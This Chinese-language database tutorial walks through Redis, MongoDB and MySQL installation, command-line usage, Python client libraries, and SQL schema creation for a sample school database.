下面我们使用第一种方式来启动Redis并将其置于后台运行，将Redis产生的输出重定向到名为redis.log的文件中。 redis-server --requirepass yourpass &gt; redis.log &amp; 可以通过ps或者netstat来检查Redis服务器是否启动成功。 ps -ef | grep redis-server netstat -nap | grep redis-server 接下来，我们尝试用Redis命令行工具redis-cli去连接服务器，该工具默认连接本机的6379端口，如果需要指定Redis服务器和端口，可以使用-h和-p参数分别进行指定。 redis-cli 进入命令行工具后，就可以通过Redis的命令来操作Redis服务器，如下所示。 127.0.0.1:6379&gt; auth yourpass OK 127.0.0.1:6379&gt; ping PONG 127.0.0.1:6379&gt; Redis有着非常丰富的数据类型，也有很多的命令来操作这些数据，具体的内容可以查看Redis命令参考，在这个网站上，除了Redis的命令参考，还有Redis的详细文档，其中包括了通知、事务、主从复制、持久化、哨兵、集群等内容。 说明：上面的插图来自付磊和张益军编著的《Redis开发与运维》一书。 127.0.0.1:6379&gt; set username admin OK 127.0.0.1:6379&gt; get username \"admin\" 127.0.0.1:6379&gt; set password \"123456\" ex 300 OK 127.0.0.1:6379&gt; get password \"123456\" 127.0.0.1:6379&gt; ttl username (integer) -1 127.0.0.1:6379&gt; ttl password (integer) 286 127.0.0.1:6379&gt; hset stu1 name hao (integer) 0 127.0.0.1:6379&gt; hset stu1 age 38 (integer) 1 127.0.0.1:6379&gt; hset stu1 gender male (integer) 1 127.0.0.1:6379&gt; hgetall stu1 1) \"name\" 2) \"hao\" 3) \"age\" 4) \"38\" 5) \"gender\" 6) \"male\" 127.0.0.1:6379&gt; hvals stu1 1) \"hao\" 2) \"38\" 3) \"male\" 127.0.0.1:6379&gt; hmset stu2 name wang age 18 gender female tel 13566778899 OK 127.0.0.1:6379&gt; hgetall stu2 1) \"name\" 2) \"wang\" 3) \"age\" 4) \"18\" 5) \"gender\" 6) \"female\" 7) \"tel\" 8) \"13566778899\" 127.0.0.1:6379&gt; lpush nums 1 2 3 4 5 (integer) 5 127.0.0.1:6379&gt; lrange nums 0 -1 1) \"5\" 2) \"4\" 3) \"3\" 4) \"2\" 5) \"1\" 127.0.0.1:6379&gt; lpop nums \"5\" 127.0.0.1:6379&gt; lpop nums \"4\" 127.0.0.1:6379&gt; rpop nums \"1\" 127.0.0.1:6379&gt; rpop nums \"2\" 127.0.0.1:6379&gt; sadd fruits apple banana orange apple grape grape (integer) 4 127.0.0.1:6379&gt; scard fruits (integer) 4 127.0.0.1:6379&gt; smembers fruits 1) \"grape\" 2) \"orange\" 3) \"banana\" 4) \"apple\" 127.0.0.1:6379&gt; sismember fruits apple (integer) 1 127.0.0.1:6379&gt; sismember fruits durian (integer) 0 127.0.0.1:6379&gt; sadd nums1 1 2 3 4 5 (integer) 5 127.0.0.1:6379&gt; sadd nums2 2 4 6 8 (integer) 4 127.0.0.1:6379&gt; sinter nums1 nums2 1) \"2\" 2) \"4\" 127.0.0.1:6379&gt; sunion nums1 nums2 1) \"1\" 2) \"2\" 3) \"3\" 4) \"4\" 5) \"5\" 6) \"6\" 7) \"8\" 127.0.0.1:6379&gt; sdiff nums1 nums2 1) \"1\" 2) \"3\" 3) \"5\" 127.0.0.1:6379&gt; zadd topsinger 5234 zhangxy 1978 chenyx 2235 zhoujl 3520 xuezq (integer) 4 127.0.0.1:6379&gt; zrange topsinger 0 -1 withscores 1) \"chenyx\" 2) \"1978\" 3) \"zhoujl\" 4) \"2235\" 5) \"xuezq\" 6) \"3520\" 7) \"zhangxy\" 8) \"5234\" 127.0.0.1:6379&gt; zrevrange topsinger 0 -1 1) \"zhangxy\" 2) \"xuezq\" 3) \"zhoujl\" 4) \"chenyx\" 127.0.0.1:6379&gt; zrevrank topsinger zhoujl (integer) 2 127.0.0.1:6379&gt; geoadd pois 116.39738549206541 39.90862689286386 tiananmen (integer) 1 127.0.0.1:6379&gt; geoadd pois 116.27172936413572 39.99135172904494 yiheyuan (integer) 1 127.0.0.1:6379&gt; geoadd pois 117.27766503308104 40.65332064313784 gubeishuizhen (integer) 1 127.0.0.1:6379&gt; geodist pois tiananmen gubeishuizhen km \"111.5333\" 127.0.0.1:6379&gt; geodist pois tiananmen yiheyuan km \"14.1230\" 127.0.0.1:6379&gt; georadius pois 116.86499108288572 40.40149669363615 50 km withdist 1) 1) \"gubeishuizhen\" 2) \"44.7408\" 在Python程序中使用Redis可以使用pip安装名为redis的三方库，该三方库的核心是一个名为Redis的类，Redis对象代表一个Redis客户端，通过该客户端可以向Redis服务器发送命令并获取执行的结果。上面我们在Redis客户端中使用的命令基本上就是Redis对象可以接收的消息，所以如果了解了Redis的命令就可以在Python中玩转Redis。 pip3 install redis 进入Python交互式环境，使用redis三方库来操作Redis。 &gt;&gt;&gt; import redis &gt;&gt;&gt; &gt;&gt;&gt; client = redis.Redis(host='127.0.0.1', port=6379, password='yourpass') &gt;&gt;&gt; &gt;&gt;&gt; client.set('username', 'admin') True &gt;&gt;&gt; client.hset('student', 'name', 'luohao') 1 &gt;&gt;&gt; client.hset('student', 'age', 40) 1 &gt;&gt;&gt; client.keys('*') [b'username', b'student'] &gt;&gt;&gt; client.get('username') b'admin' &gt;&gt;&gt; client.hgetall('student') {b'name': b'luohao', b'age': b'40'} MongoDB概述MongoDB简介MongoDB是2009年问世的一个面向文档的数据库管理系统，由C++语言编写，旨在为Web应用提供可扩展的高性能数据存储解决方案。虽然在划分类别的时候后，MongoDB被认为是NoSQL的产品，但是它更像一个介于关系数据库和非关系数据库之间的产品，在非关系数据库中它功能最丰富，最像关系数据库。 MongoDB将数据存储为一个文档，一个文档由一系列的“键值对”组成，其文档类似于JSON对象，但是MongoDB对JSON进行了二进制处理（能够更快的定位key和value），因此其文档的存储格式称为BSON。关于JSON和BSON的差别大家可以看看MongoDB官方网站的文章《JSON and BSON》。 目前，MongoDB已经提供了对Windows、macOS、Linux、Solaris等多个平台的支持，而且也提供了多种开发语言的驱动程序，Python当然是其中之一。 MongoDB的安装和启动可以从MongoDB的官方下载链接下载MongoDB，官方提供了Windows、macOS和多种Linux版本的安装包。下面以CentOS为例，简单说一下如何安装和启动MongoDB。 下载服务器和命令行的RPM安装包。 wget https://repo.mongodb.org/yum/redhat/7/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.2-1.el7.x86_64.rpm rpm -ivh mongodb-org-server-4.4.2-1.el7.x86_64.rpm wget https://repo.mongodb.org/yum/redhat/7/mongodb-org/4.4/x86_64/RPMS/mongodb-org-shell-4.4.2-1.el7.x86_64.rpm rpm -ivh mongodb-org-shell-4.4.2-1.el7.x86_64.rpm 启动MongoDB服务器，需要先创建保存数据的文件夹。 mkdir -p /data/db 修改MongoDB的配置文件，将其中bindIp选项的值修改为本机IP地址而不是默认的127.0.0.1，本机IP地址可以通过ifconfig命令进行查看。 vim /etc/mongod.conf 使用systemctl命令启动服务。 systemctl start mongod MongoDB基本概念我们通过与关系型数据库的比较来说明MongoDB中的一些概念。 SQL MongoDB database database table（表） collection（集合） row（行） document（文档） column（列） field（字段） index index table joins（表连接） （嵌套文档） primary key primary key 通过Shell操作MongoDB 启动命令行工具，进入交互式环境。 mongo 说明： 查看、创建和删除数据库。 &gt; // 显示所有数据库 &gt; show dbs admin 0.000GB config 0.000GB local 0.000GB &gt; // 创建并切换到school数据库 &gt; use school switched to db school &gt; // 删除当前数据库 &gt; db.dropDatabase() { \"ok\" : 1 } 创建、删除和查看集合。 &gt; // 创建并切换到school数据库 &gt; use school switched to db school &gt; // 创建colleges集合 &gt; db.createCollection('colleges') { \"ok\" : 1 } &gt; // 创建students集合 &gt; db.createCollection('students') { \"ok\" : 1 } &gt; // 查看所有集合 &gt; show collections colleges students &gt; // 删除colleges集合 &gt; db.colleges.drop() true 说明：在MongoDB中插入文档时如果集合不存在会自动创建集合，所以也可以按照下面的方式通过插入文档来创建集合。 文档的CRUD操作。 &gt; // 向students集合插入文档 &gt; db.students.insert({stuid: 1001, name: '骆昊', age: 40}) WriteResult({ \"nInserted\" : 1 }) &gt; // 向students集合插入文档 &gt; db.students.save({stuid: 1002, name: '王大锤', tel: '13012345678', gender: '男'}) WriteResult({ \"nInserted\" : 1 }) &gt; // 查看所有文档 &gt; db.students.find() { \"_id\" : ObjectId(\"5b13c72e006ad854460ee70b\"), \"stuid\" : 1001, \"name\" : \"骆昊\", \"age\" : 38 } { \"_id\" : ObjectId(\"5b13c790006ad854460ee70c\"), \"stuid\" : 1002, \"name\" : \"王大锤\", \"tel\" : \"13012345678\", \"gender\" : \"男\" } &gt; // 更新stuid为1001的文档 &gt; db.students.update({stuid: 1001}, {'$set': {tel: '13566778899', gender: '男'}}) WriteResult({ \"nMatched\" : 1, \"nUpserted\" : 0, \"nModified\" : 1 }) &gt; // 插入或更新stuid为1003的文档 &gt; db.students.update({stuid: 1003}, {'$set': {name: '白元芳', tel: '13022223333', gender: '男'}}, upsert=true) WriteResult({ \"nMatched\" : 0, \"nUpserted\" : 1, \"nModified\" : 0, \"_id\" : ObjectId(\"5b13c92dd185894d7283efab\") }) &gt; // 查询所有文档 &gt; db.students.find().pretty() { \"_id\" : ObjectId(\"5b13c72e006ad854460ee70b\"), \"stuid\" : 1001, \"name\" : \"骆昊\", \"age\" : 38, \"gender\" : \"男\", \"tel\" : \"13566778899\" } { \"_id\" : ObjectId(\"5b13c790006ad854460ee70c\"), \"stuid\" : 1002, \"name\" : \"王大锤\", \"tel\" : \"13012345678\", \"gender\" : \"男\" } { \"_id\" : ObjectId(\"5b13c92dd185894d7283efab\"), \"stuid\" : 1003, \"gender\" : \"男\", \"name\" : \"白元芳\", \"tel\" : \"13022223333\" } &gt; // 查询stuid大于1001的文档 &gt; db.students.find({stuid: {'$gt': 1001}}).pretty() { \"_id\" : ObjectId(\"5b13c790006ad854460ee70c\"), \"stuid\" : 1002, \"name\" : \"王大锤\", \"tel\" : \"13012345678\", \"gender\" : \"男\" } { \"_id\" : ObjectId(\"5b13c92dd185894d7283efab\"), \"stuid\" : 1003, \"gender\" : \"男\", \"name\" : \"白元芳\", \"tel\" : \"13022223333\" } &gt; // 查询stuid大于1001的文档只显示name和tel字段 &gt; db.students.find({stuid: {'$gt': 1001}}, {_id: 0, name: 1, tel: 1}).pretty() { \"name\" : \"王大锤\", \"tel\" : \"13012345678\" } { \"name\" : \"白元芳\", \"tel\" : \"13022223333\" } &gt; // 查询name为“骆昊”或者tel为“13022223333”的文档 &gt; db.students.find({'$or': [{name: '骆昊'}, {tel: '13022223333'}]}, {_id: 0, name: 1, tel: 1}).pretty() { \"name\" : \"骆昊\", \"tel\" : \"13566778899\" } { \"name\" : \"白元芳\", \"tel\" : \"13022223333\" } &gt; // 查询学生文档跳过第1条文档只查1条文档 &gt; db.students.find().skip(1).limit(1).pretty() { \"_id\" : ObjectId(\"5b13c790006ad854460ee70c\"), \"stuid\" : 1002, \"name\" : \"王大锤\", \"tel\" : \"13012345678\", \"gender\" : \"男\" } &gt; // 对查询结果进行排序(1表示升序，-1表示降序) &gt; db.students.find({}, {_id: 0, stuid: 1, name: 1}).sort({stuid: -1}) { \"stuid\" : 1003, \"name\" : \"白元芳\" } { \"stuid\" : 1002, \"name\" : \"王大锤\" } { \"stuid\" : 1001, \"name\" : \"骆昊\" } &gt; // 在指定的一个或多个字段上创建索引 &gt; db.students.ensureIndex({name: 1}) { \"createdCollectionAutomatically\" : false, \"numIndexesBefore\" : 1, \"numIndexesAfter\" : 2, \"ok\" : 1 } 使用MongoDB可以非常方便的配置数据复制，通过冗余数据来实现数据的高可用以及灾难恢复，也可以通过数据分片来应对数据量迅速增长的需求。关于MongoDB更多的操作可以查阅官方文档 ，同时推荐大家阅读Kristina Chodorow写的《MongoDB权威指南》。 在Python程序中操作MongoDB可以通过pip安装pymongo来实现对MongoDB的操作。 pip install pymongo 进入Python交互式环境，就可以执行以下的操作。 &gt;&gt;&gt; from pymongo import MongoClient &gt;&gt;&gt; &gt;&gt;&gt; client = MongoClient('mongodb://127.0.0.1:27017') &gt;&gt;&gt; db = client.school &gt;&gt;&gt; for student in db.students.find(): ... print('学号:', student['stuid']) ... print('姓名:', student['name']) ... print('电话:', student['tel']) ... 学号: 1001.0 姓名: 骆昊 电话: 13566778899 学号: 1002.0 姓名: 王大锤 电话: 13012345678 学号: 1003.0 姓名: 白元芳 电话: 13022223333 &gt;&gt;&gt; db.students.find().count() 3 &gt;&gt;&gt; db.students.remove() {'n': 3, 'ok': 1.0} &gt;&gt;&gt; db.students.find().count() 0 &gt;&gt;&gt; from pymongo import ASCENDING &gt;&gt;&gt; &gt;&gt;&gt; coll = db.students &gt;&gt;&gt; coll.create_index([('name', ASCENDING)], unique=True) 'name_1' &gt;&gt;&gt; coll.insert_one({'stuid': int(1001), 'name': '骆昊', 'gender': True}) &lt;pymongo.results.InsertOneResult object at 0x1050cc6c8&gt; &gt;&gt;&gt; coll.insert_many([{'stuid': int(1002), 'name': '王大锤', 'gender': False}, {'stuid': int(1003), 'name': '白元芳', 'gender': True}]) &lt;pymongo.results.InsertManyResult object at 0x1050cc8c8&gt; &gt;&gt;&gt; for student in coll.find({'gender': True}): ... print('学号:', student['stuid']) ... print('姓名:', student['name']) ... print('性别:', '男' if student['gender'] else '女') ... 学号: 1001 姓名: 骆昊 性别: 男 学号: 1003 姓名: 白元芳 性别: 男 关于pymongo更多的知识可以通过它的官方文档进行了解，也可以使用MongoEngine这样的库来简化Python程序对MongoDB的操作，除此之外，还有以异步I/O方式访问MongoDB的三方库motor都是不错的选择。","categories":[],"tags":[{"name":"Nosql","slug":"Nosql","permalink":"http://www.xiaocaibi.top/tags/Nosql/"}]},{"title":"36-38.关系型数据库MySQL","slug":"36-38-关系型数据库MySQL","date":"2021-05-24T05:42:57.000Z","updated":"2021-09-20T08:47:43.948Z","comments":true,"path":"posts/3a0077e5.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3a0077e5.html","excerpt":"","text":"关系数据库入门关系数据库概述 数据持久化 - 将数据保存到能够长久保存数据的存储介质中，在掉电的情况下数据也不会丢失。 数据库发展史 - 网状数据库、层次数据库、关系数据库、NoSQL数据库。 1970年，IBM的研究员E.F.Codd在Communication of the ACM上发表了名为A Relational Model of Data for Large Shared Data Banks的论文，提出了关系模型的概念，奠定了关系模型的理论基础。后来Codd又陆续发表多篇文章，论述了范式理论和衡量关系系统的12条标准，用数学理论奠定了关系数据库的基础。 关系数据库特点。 理论基础：集合论和关系代数。 具体表象：用二维表（有行和列）组织数据。 编程语言：结构化查询语言（SQL）。 ER模型（实体关系模型）和概念模型图。 ER模型，全称为实体关系模型（Entity-Relationship Model），由美籍华裔计算机科学家陈品山先生提出，是概念数据模型的高层描述方式，如下图所示。 实体 - 矩形框 属性 - 椭圆框 关系 - 菱形框 重数 - 1:1（一对一） / 1:N（一对多） / M:N（多对多） 实际项目开发中，我们可以利用数据库建模工具（如：PowerDesigner）来绘制概念数据模型（其本质就是ER模型），然后再设置好目标数据库系统，将概念模型转换成物理模型，最终生成创建二维表的SQL（很多工具都可以根据我们设计的物理模型图以及设定的目标数据库来导出SQL或直接生成数据表）。 关系数据库产品。 Oracle - 目前世界上使用最为广泛的数据库管理系统，作为一个通用的数据库系统，它具有完整的数据管理功能；作为一个关系数据库，它是一个完备关系的产品；作为分布式数据库，它实现了分布式处理的功能。在Oracle最新的12c版本中，还引入了多承租方架构，使用该架构可轻松部署和管理数据库云。 DB2 - IBM公司开发的、主要运行于Unix（包括IBM自家的AIX）、Linux、以及Windows服务器版等系统的关系数据库产品。DB2历史悠久且被认为是最早使用SQL的数据库产品，它拥有较为强大的商业智能功能。 SQL Server - 由Microsoft开发和推广的关系型数据库产品，最初适用于中小企业的数据管理，但是近年来它的应用范围有所扩展，部分大企业甚至是跨国公司也开始基于它来构建自己的数据管理系统。 MySQL - MySQL是开放源代码的，任何人都可以在GPL（General Public License）的许可下下载并根据个性化的需要对其进行修改。MySQL因为其速度、可靠性和适应性而备受关注。 PostgreSQL - 在BSD许可证下发行的开放源代码的关系数据库产品。 MySQL简介MySQL最早是由瑞典的MySQL AB公司开发的一个开放源码的关系数据库管理系统，该公司于2008年被昇阳微系统公司（Sun Microsystems）收购。在2009年，甲骨文公司（Oracle）收购昇阳微系统公司，因此在这之后MySQL成为了Oracle旗下产品。 MySQL在过去由于性能高、成本低、可靠性好，已经成为最流行的开源数据库，因此被广泛地应用于中小型网站开发。随着MySQL的不断成熟，它也逐渐被应用于更多大规模网站和应用，比如维基百科、谷歌（Google）、脸书（Facebook）、淘宝网等网站都使用了MySQL来提供数据持久化服务。 甲骨文公司收购后昇阳微系统公司，大幅调涨MySQL商业版的售价，且甲骨文公司不再支持另一个自由软件项目OpenSolaris的发展，因此导致自由软件社区对于Oracle是否还会持续支持MySQL社区版（MySQL的各个发行版本中唯一免费的版本）有所担忧，MySQL的创始人麦克尔·维德纽斯以MySQL为基础，成立分支计划MariaDB（以他女儿的名字命名的数据库）。有许多原来使用MySQL数据库的公司（例如：维基百科）已经陆续完成了从MySQL数据库到MariaDB数据库的迁移。 安装和配置 说明：下面的安装和配置都是以CentOS Linux环境为例，如果需要在其他系统下安装MySQL，读者可以自行在网络上查找对应的安装教程）。 刚才说过，MySQL有一个分支版本名叫MariaDB，该数据库旨在继续保持MySQL数据库在GNU GPL下开源。如果要使用MariaDB作为MySQL的替代品，可以使用下面的命令进行安装。 yum install mariadb mariadb-server 如果要安装官方版本的MySQL，可以在MySQL官方网站下载安装文件。首先在下载页面中选择平台和版本，然后找到对应的下载链接。下面以MySQL 5.7.26版本和Red Hat Enterprise Linux为例，直接下载包含所有安装文件的归档文件，解归档之后通过包管理工具进行安装。 wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.26-1.el7.x86_64.rpm-bundle.tar tar -xvf mysql-5.7.26-1.el7.x86_64.rpm-bundle.tar 如果系统上有MariaDB相关的文件，需要先移除MariaDB相关的文件。 yum list installed | grep mariadb | awk '{print $1}' | xargs yum erase -y 接下来可以按照如下所示的顺序用RPM（Redhat Package Manager）工具安装MySQL。 rpm -ivh mysql-community-common-5.7.26-1.el7.x86_64.rpm rpm -ivh mysql-community-libs-5.7.26-1.el7.x86_64.rpm rpm -ivh mysql-community-libs-compat-5.7.26-1.el7.x86_64.rpm rpm -ivh mysql-community-devel-5.7.26-1.el7.x86_64.rpm rpm -ivh mysql-community-client-5.7.26-1.el7.x86_64.rpm rpm -ivh mysql-community-server-5.7.26-1.el7.x86_64.rpm 可以使用下面的命令查看已经安装的MySQL相关的包。 rpm -qa | grep mysql 配置MySQL。 MySQL的配置文件在/etc目录下，名为my.cnf，默认的配置文件内容如下所示。如果对这个文件不理解并没有关系，什么时候用到这个配置文件什么时候再了解它就行了。 cat /etc/my.cnf # For advice on how to change settings please see # http://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html [mysqld] # # Remove leading # and set to the amount of RAM for the most important data # cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%. # innodb_buffer_pool_size = 128M # # Remove leading # to turn on a very important data integrity option: logging # changes to the binary log between backups. # log_bin # # Remove leading # to set options mainly useful for reporting servers. # The server defaults are faster for transactions and fast SELECTs. # Adjust sizes as needed, experiment to find the optimal values. # join_buffer_size = 128M # sort_buffer_size = 2M # read_rnd_buffer_size = 2M datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock # Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0 log-error=/var/log/mysqld.log pid-file=/var/run/mysqld/mysqld.pid 启动MySQL服务。 可以使用下面的命令来启动MySQL。 service mysqld start 在CentOS 7中，更推荐使用下面的命令来启动MySQL。 systemctl start mysqld 启动MySQL成功后，可以通过下面的命令来检查网络端口使用情况，MySQL默认使用3306端口。 netstat -ntlp | grep mysql 也可以使用下面的命令查找是否有名为mysqld的进程。 pgrep mysqld 使用MySQL客户端工具连接服务器。 命令行工具： mysql -u root -p 说明：启动客户端时，-u参数用来指定用户名，MySQL默认的超级管理账号为root；-p表示要输入密码（用户口令）；如果连接的是其他主机而非本机，可以用-h来指定连接主机的主机名或IP地址。 如果是首次安装MySQL，可以使用下面的命令来找到默认的初始密码。 cat /var/log/mysqld.log | grep password 上面的命令会查看MySQL的日志带有password的行，在显示的结果中root@localhost:后面的部分就是默认设置的初始密码。 修改超级管理员（root）的访问口令为123456。 set global validate_password_policy=0; set global validate_password_length=6; alter user 'root'@'localhost' identified by '123456'; 说明：MySQL较新的版本默认不允许使用弱口令作为用户口令，所以我们通过上面的前两条命令修改了验证用户口令的策略和口令的长度。事实上我们不应该使用弱口令，因为存在用户口令被暴力破解的风险。近年来，攻击数据库窃取数据和劫持数据库勒索比特币的事件屡见不鲜，要避免这些潜在的风险，最为重要的一点是不要让数据库服务器暴露在公网上（最好的做法是将数据库置于内网，至少要做到不向公网开放数据库服务器的访问端口），另外要保管好root账号的口令，应用系统需要访问数据库时，通常不使用root账号进行访问，而是创建其他拥有适当权限的账号来访问。 再次使用客户端工具连接MySQL服务器时，就可以使用新设置的口令了。在实际开发中，为了方便用户操作，可以选择图形化的客户端工具来连接MySQL服务器，包括： MySQL Workbench（官方提供的工具） Navicat for MySQL（界面简单优雅，功能直观强大） SQLyog for MySQL（强大的MySQL数据库管理员工具） 常用命令。 查看服务器版本。 select version(); 查看所有数据库。 show databases; 切换到指定数据库。 use mysql; 查看数据库下所有表。 show tables; 获取帮助。 ? contents; ? functions; ? numeric functions; ? round; ? data types; ? longblob; SQL详解基本操作我们通常可以将SQL分为三类：DDL（数据定义语言）、DML（数据操作语言）和DCL（数据控制语言）。DDL主要用于创建（create）、删除（drop）、修改（alter）数据库中的对象，比如创建、删除和修改二维表；DML主要负责插入数据（insert）、删除数据（delete）、更新数据（update）和查询（select）；DCL通常用于授予权限（grant）和召回权限（revoke）。 说明：SQL是不区分大小写的语言，为了书写方便，下面的SQL都使用了小写字母来书写。 DDL（数据定义语言） -- 如果存在名为school的数据库就删除它 drop database if exists school; -- 创建名为school的数据库并设置默认的字符集和排序方式 create database school default charset utf8; -- 切换到school数据库上下文环境 use school; -- 创建学院表 create table tb_college ( collid int auto_increment comment '编号', collname varchar(50) not null comment '名称', collintro varchar(500) default '' comment '介绍', primary key (collid) ); -- 创建学生表 create table tb_student ( stuid int not null comment '学号', stuname varchar(20) not null comment '姓名', stusex boolean default 1 comment '性别', stubirth date not null comment '出生日期', stuaddr varchar(255) default '' comment '籍贯', collid int not null comment '所属学院', primary key (stuid), foreign key (collid) references tb_college (collid) ); -- 创建教师表 create table tb_teacher ( teaid int not null comment '工号', teaname varchar(20) not null comment '姓名', teatitle varchar(10) default '助教' comment '职称', collid int not null comment '所属学院', primary key (teaid), foreign key (collid) references tb_college (collid) ); -- 创建课程表 create table tb_course ( couid int not null comment '编号', couname varchar(50) not null comment '名称', coucredit int not null comment '学分', teaid int not null comment '授课老师', primary key (couid), foreign key (teaid) references tb_teacher (teaid) ); -- 创建选课记录表 create table tb_record ( recid int auto_increment comment '选课记录编号', sid int not null comment '选课学生', cid int not null comment '所选课程', seldate datetime default now() comment '选课时间日期', score decimal(4,1) comment '考试成绩', primary key (recid), foreign key (sid) references tb_student (stuid), foreign key (cid) references tb_course (couid), unique (sid, cid) ); 上面的DDL有几个地方需要强调一下： 创建数据库时，我们通过default charset utf8指定了数据库默认使用的字符集，我们推荐使用该字符集，因为utf8能够支持国际化编码。如果将来数据库中用到的字符可能包括类似于Emoji这样的图片字符，也可以将默认字符集设定为utf8mb4（最大4字节的utf-8编码）。查看MySQL支持的字符集可以执行下面的语句。 show character set; +----------+---------------------------------+---------------------+--------+ | Charset | Description | Default collation | Maxlen | +----------+---------------------------------+---------------------+--------+ | big5 | Big5 Traditional Chinese | big5_chinese_ci | 2 | | dec8 | DEC West European | dec8_swedish_ci | 1 | | cp850 | DOS West European | cp850_general_ci | 1 | | hp8 | HP West European | hp8_english_ci | 1 | | koi8r | KOI8-R Relcom Russian | koi8r_general_ci | 1 | | latin1 | cp1252 West European | latin1_swedish_ci | 1 | | latin2 | ISO 8859-2 Central European | latin2_general_ci | 1 | | swe7 | 7bit Swedish | swe7_swedish_ci | 1 | | ascii | US ASCII | ascii_general_ci | 1 | | ujis | EUC-JP Japanese | ujis_japanese_ci | 3 | | sjis | Shift-JIS Japanese | sjis_japanese_ci | 2 | | hebrew | ISO 8859-8 Hebrew | hebrew_general_ci | 1 | | tis620 | TIS620 Thai | tis620_thai_ci | 1 | | euckr | EUC-KR Korean | euckr_korean_ci | 2 | | koi8u | KOI8-U Ukrainian | koi8u_general_ci | 1 | | gb2312 | GB2312 Simplified Chinese | gb2312_chinese_ci | 2 | | greek | ISO 8859-7 Greek | greek_general_ci | 1 | | cp1250 | Windows Central European | cp1250_general_ci | 1 | | gbk | GBK Simplified Chinese | gbk_chinese_ci | 2 | | latin5 | ISO 8859-9 Turkish | latin5_turkish_ci | 1 | | armscii8 | ARMSCII-8 Armenian | armscii8_general_ci | 1 | | utf8 | UTF-8 Unicode | utf8_general_ci | 3 | | ucs2 | UCS-2 Unicode | ucs2_general_ci | 2 | | cp866 | DOS Russian | cp866_general_ci | 1 | | keybcs2 | DOS Kamenicky Czech-Slovak | keybcs2_general_ci | 1 | | macce | Mac Central European | macce_general_ci | 1 | | macroman | Mac West European | macroman_general_ci | 1 | | cp852 | DOS Central European | cp852_general_ci | 1 | | latin7 | ISO 8859-13 Baltic | latin7_general_ci | 1 | | utf8mb4 | UTF-8 Unicode | utf8mb4_general_ci | 4 | | cp1251 | Windows Cyrillic | cp1251_general_ci | 1 | | utf16 | UTF-16 Unicode | utf16_general_ci | 4 | | utf16le | UTF-16LE Unicode | utf16le_general_ci | 4 | | cp1256 | Windows Arabic | cp1256_general_ci | 1 | | cp1257 | Windows Baltic | cp1257_general_ci | 1 | | utf32 | UTF-32 Unicode | utf32_general_ci | 4 | | binary | Binary pseudo charset | binary | 1 | | geostd8 | GEOSTD8 Georgian | geostd8_general_ci | 1 | | cp932 | SJIS for Windows Japanese | cp932_japanese_ci | 2 | | eucjpms | UJIS for Windows Japanese | eucjpms_japanese_ci | 3 | | gb18030 | China National Standard GB18030 | gb18030_chinese_ci | 4 | +----------+---------------------------------+---------------------+--------+ 41 rows in set (0.00 sec) 如果要设置MySQL服务启动时默认使用的字符集，可以修改MySQL的配置并添加以下内容 [mysqld] character-set-server=utf8 在创建表的时候，我们可以在右圆括号的后面通过engine=XXX来指定表的存储引擎，MySQL支持多种存储引擎，可以通过show engines命令进行查看。MySQL 5.5以后的版本默认使用的存储引擎是InnoDB，它正好也就是我们推荐大家使用的存储引擎（因为InnoDB更适合互联网应用对高并发、性能以及事务支持等方面的需求）。 show engines\\G *************************** 1. row *************************** Engine: InnoDB Support: DEFAULT Comment: Supports transactions, row-level locking, and foreign keys Transactions: YES XA: YES Savepoints: YES *************************** 2. row *************************** Engine: MRG_MYISAM Support: YES Comment: Collection of identical MyISAM tables Transactions: NO XA: NO Savepoints: NO *************************** 3. row *************************** Engine: MEMORY Support: YES Comment: Hash based, stored in memory, useful for temporary tables Transactions: NO XA: NO Savepoints: NO *************************** 4. row *************************** Engine: BLACKHOLE Support: YES Comment: /dev/null storage engine (anything you write to it disappears) Transactions: NO XA: NO Savepoints: NO *************************** 5. row *************************** Engine: MyISAM Support: YES Comment: MyISAM storage engine Transactions: NO XA: NO Savepoints: NO *************************** 6. row *************************** Engine: CSV Support: YES Comment: CSV storage engine Transactions: NO XA: NO Savepoints: NO *************************** 7. row *************************** Engine: ARCHIVE Support: YES Comment: Archive storage engine Transactions: NO XA: NO Savepoints: NO *************************** 8. row *************************** Engine: PERFORMANCE_SCHEMA Support: YES Comment: Performance Schema Transactions: NO XA: NO Savepoints: NO *************************** 9. row *************************** Engine: FEDERATED Support: NO Comment: Federated MySQL storage engine Transactions: NULL XA: NULL Savepoints: NULL 9 rows in set (0.00 sec) 下面的表格对MySQL几种常用的数据引擎进行了简单的对比。 特性 InnoDB MRG_MYISAM MEMORY MyISAM 存储限制 有 没有 有 有 事务 支持 锁机制 行锁 表锁 表锁 表锁 B树索引 支持 支持 支持 支持 哈希索引 支持 全文检索 支持（5.6+） 支持 集群索引 支持 数据缓存 支持 支持 索引缓存 支持 支持 支持 支持 数据可压缩 支持 内存使用 高 低 中 低 存储空间使用 高 低 低 批量插入性能 低 高 高 高 是否支持外键 支持 通过上面的比较我们可以了解到，InnoDB是唯一能够支持外键、事务以及行锁的存储引擎，所以我们之前说它更适合互联网应用，而且它也是较新的MySQL版本中默认使用的存储引擎。 在定义表结构为每个字段选择数据类型时，如果不清楚哪个数据类型更合适，可以通过MySQL的帮助系统来了解每种数据类型的特性、数据的长度和精度等相关信息。 ? data types You asked for help about help category: \"Data Types\" For more information, type 'help &lt;item&gt;', where &lt;item&gt; is one of the following topics: AUTO_INCREMENT BIGINT BINARY BIT BLOB BLOB DATA TYPE BOOLEAN CHAR CHAR BYTE DATE DATETIME DEC DECIMAL DOUBLE DOUBLE PRECISION ENUM FLOAT INT INTEGER LONGBLOB LONGTEXT MEDIUMBLOB MEDIUMINT MEDIUMTEXT SET DATA TYPE SMALLINT TEXT TIME TIMESTAMP TINYBLOB TINYINT TINYTEXT VARBINARY VARCHAR YEAR DATA TYPE ? varchar Name: 'VARCHAR' Description: [NATIONAL] VARCHAR(M) [CHARACTER SET charset_name] [COLLATE collation_name] A variable-length string. M represents the maximum column length in characters. The range of M is 0 to 65,535. The effective maximum length of a VARCHAR is subject to the maximum row size (65,535 bytes, which is shared among all columns) and the character set used. For example, utf8 characters can require up to three bytes per character, so a VARCHAR column that uses the utf8 character set can be declared to be a maximum of 21,844 characters. See http://dev.mysql.com/doc/refman/5.7/en/column-count-limit.html. MySQL stores VARCHAR values as a 1-byte or 2-byte length prefix plus data. The length prefix indicates the number of bytes in the value. A VARCHAR column uses one length byte if values require no more 